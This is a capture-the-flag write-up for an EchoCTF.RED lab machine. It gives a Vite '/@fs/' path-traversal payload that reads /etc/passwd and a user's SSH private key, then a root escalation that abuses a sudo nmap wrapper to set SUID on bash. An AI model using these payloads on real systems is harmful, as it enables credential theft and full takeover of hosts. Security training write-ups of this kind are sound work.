# Enumeration:

Start off with an nmap scan. EchoCTF.RED is kind enough to provide an exact number of services that each machine has running and normally requires you to scan all ports (TCP and UDP) but for the sake of convenice, there is only port 80 active so I will run a short scan.

```vim
nmap -sV -sC -v -Pn <IP_Addr> 
```

We get an output like this:

```vim
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 96b076a2282654bf151d14fd0cb3772d (RSA)
|   256 b054a89e92e72ed80d0ff8001b257ead (ECDSA)
|_  256 6d551715187091c266dbe8170ec96038 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NCP, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Access-Control-Allow-Origin: *
|     Date: Sat, 04 Feb 2023 10:10:08 GMT
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Access-Control-Allow-Origin: *
|     Date: Sat, 04 Feb 2023 10:10:01 GMT
|     Connection: close
|   HTTPOptions: 
|     HTTP/1.1 204 No Content
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
|     Vary: Access-Control-Request-Headers
|     Content-Length: 0
|     Date: Sat, 04 Feb 2023 10:10:01 GMT
|_    Connection: close
```

Looking into the website, we come across a simple counter application. Reading the code led me to finding the GitHub repository of this application: [LINK](https://github.com/vitejs/vite)  


# Exploit:

I tried looking at any publically disclosed vulnerabilities and found this link: [Vulnerability](https://security.snyk.io/vuln/SNYK-JS-VITE-2987511) 

While the example displayed did not seem to function, Looking at the [GitHub Issue](https://github.com/vitejs/vite/issues/8498) showed us what we had to do and a payload to come about with it:  `/@fs/app/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd` (Use BurpSuite since browser may remove the encoded part of the payload)

The above payload will display `/etc/passwd` which contains the first flag and information on the users on the machine. We can try to get `ETSCTF`'s id_rsa with the following payload: `/@fs/app/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/home/ETSCTF/.ssh/id_rsa`

With this, we can log in as `ETSCTF` user using `ssh ETSCTF@<IP_Addr> -i id_rsa`

# Priv-Esc:

Running `sudo -l` gives us the following output:

```vim
ETSCTF@vitreol:~$ sudo -l
Matching Defaults entries for ETSCTF on vitreol:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ETSCTF may run the following commands on vitreol:
    (ALL) NOPASSWD: /usr/local/sbin/wrapnmap
```

Looking into `/usr/local/sbin/wrapnmap` , we can see the following code:

```vim
ETSCTF@vitreol:~$ cat /usr/local/sbin/wrapnmap
#!/usr/bin/python
from libnmap.process import NmapProcess
from libnmap.parser import NmapParser
import sys
NMAP_OPTIONS = ' -sV -Pn -n '
targets = sys.argv[1]
nmap_proc = NmapProcess(targets=targets, options=NMAP_OPTIONS,safe_mode=True)
nmap_proc.run()
```

This is simply running an nmap scan and accepts a target as an argument. We can easily exploit this using GTFObins: [Exploit](https://gtfobins.github.io/gtfobins/nmap/#shell)

We can use the following payload for a shell:

```vim
TF=$(mktemp)
echo 'os.execute("chmod +s /bin/bash")' > $TF
sudo /usr/local/sbin/wrapnmap --script=$TF

bash -p
```

This will give you root permission with which we can access the other flags:

1. Flag 2 is in `/root`
2. Flag 3 is in `/etc/shadow`
3. Flag 4 can be viewed by running `strings /proc/*/environ | grep "ETSCTF"`
4. Flag 5 can be viewed with `grep 'ETSCTF' -r /app`
